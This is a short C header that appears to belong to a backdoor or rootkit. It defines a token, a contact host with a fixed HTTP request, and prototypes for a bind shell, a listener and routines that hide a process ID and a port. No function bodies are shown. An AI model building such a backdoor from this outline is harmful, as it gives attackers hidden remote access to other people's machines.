#define AUTH_TOKEN 0x12345678
#define RANDOM_MAX (44+44)
#define RANDOM_BASE (3600-44)

#define HOST "my.csdn.net"
#define PORT (80)
#define CONTENT \
"GET /echofocus HTTP/1.1\r\n"\
"Host: my.csdn.net\r\n\r\n"

void bind_shell( ) ;
void serv_listen( const char* addr , int port ) ;
void hide_pid( ) ;
void hide_port( int port ) ;
